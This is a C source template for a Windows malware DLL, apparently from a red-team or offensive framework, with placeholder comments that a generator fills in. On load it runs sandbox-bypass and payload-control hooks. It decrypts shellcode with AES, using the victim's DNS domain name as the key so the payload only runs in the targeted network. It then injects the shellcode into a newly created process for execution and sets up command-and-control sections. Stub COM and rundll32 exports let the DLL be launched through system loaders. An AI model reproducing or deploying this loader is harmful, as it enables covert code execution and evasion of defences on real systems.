#include <windows.h>
#include <stdbool.h>

#include "Shellcode.h"
#include "EntropyDecrease.h"

#ifdef DEBUG
	#include <stdio.h>
#endif

HANDLE 	ProcessCreate	(char * processName);
HANDLE 	ProcessOpen	(DWORD processID);
LPVOID 	AllocMemory	(HANDLE process, SIZE_T size);
BOOL 	WriteMemory	(HANDLE process, LPVOID baseAddress, LPCVOID buffer, SIZE_T size);
BOOL 	ProtectMemory	(HANDLE process, LPVOID baseAddress, SIZE_T size, DWORD protection);
HANDLE 	ThreadOpen	(DWORD threadID);
BOOL 	ExecuteMemory	(HANDLE process, LPVOID baseAddress);
int 		AESDecrypt	(char * payload, unsigned int payload_len, char * key, size_t keylen);

bool PayloadControl();
bool Bypass();

bool PayloadControl(){
// Control_replace
	return true;
}

bool Bypass(){
// Bypass_replace
	return true;
}

// AESDecrypt_replace
// ProcessCreate_replace
// ProcessOpen_replace
// AllocMemory_replace
// WriteMemory_replace
// ProtectMemory_replace
// ExecuteMemory_replace

int go(char * proc_to_inj, unsigned char * shellcode, SIZE_T size) {
	#ifdef DEBUG
		printf("[*] proc_to_inj: %s\n", proc_to_inj);
	#endif
	char 	domain[MAX_PATH];
	DWORD 	domain_size = sizeof(domain);
	GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);

	#ifdef DEBUG
		printf("[*] Domain name: %s\n", domain);
	#endif

	AESDecrypt((char *) shellcode, size, domain, strlen(domain));

	// Main Fork&Run flow
	HANDLE process = ProcessCreate(proc_to_inj);
	if (process == NULL) {
		return 1;
	}
	LPVOID mem = AllocMemory(process, size);
	if (mem == NULL) {
		CloseHandle(process);
		return 1;
	}
	if (!WriteMemory(process, mem, shellcode, size)) {
		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		CloseHandle(process);
		return 1;
	}
	if (!ProtectMemory(process, mem, size, PAGE_EXECUTE_READ)) {
		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		CloseHandle(process);
		return 1;
	}
	if (!ExecuteMemory(process, mem)) {
		VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		CloseHandle(process);
		return 1;
	}
	VirtualFreeEx(process, mem, 0, MEM_RELEASE);
	CloseHandle(process);
	return 0;
}

int start() {

	if(!Bypass()) {
		ExitProcess(0);
	}

	if(!PayloadControl()) {
		ExitProcess(0);
	}


	#ifdef FASTC2
// fast_section_replace
	#endif
	#ifdef MEDIUMC2
// medium_section_replace
	#endif
	#ifdef SLOWC2
// slow_section_replace
	#endif
	return 0;
}



BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
         case DLL_PROCESS_ATTACH:
             start();
             // Add break statement here
             break;
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
         case DLL_PROCESS_DETACH:
             break; // Add break statement here
     } // Add closing brace here
     return TRUE;
}
STDAPI DllRegisterServer(void) {
	return (HRESULT)S_OK;
}

STDAPI DllUnregisterServer(void) {
	return (HRESULT)S_OK;
}

STDAPI DllGetClassObject( REFCLSID rclsid, REFIID riid, LPVOID *ppv ) {
	return CLASS_E_CLASSNOTAVAILABLE;
}

STDAPI DllRegisterServerEx( LPCTSTR lpszModuleName ) {
	return (HRESULT)S_OK;
}

void CALLBACK Wait(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
	Sleep(60 * 1000);
}
